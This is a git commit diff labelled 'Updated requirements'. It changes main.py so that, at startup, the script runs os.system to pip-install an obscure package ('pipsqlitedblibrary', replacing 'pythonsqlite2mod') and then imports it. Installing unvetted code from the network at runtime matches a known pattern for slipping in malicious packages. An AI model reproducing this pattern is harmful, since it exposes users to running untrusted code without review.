0012c02e24b7501d4876daa3be2c993060eaa897
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 17:10:18 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlite2mod")
-import pythonsqlite2mod
+os.system("pip install pipsqlitedblibrary")
+import pipsqlitedblibrary
 import json
 import httpx
 import time
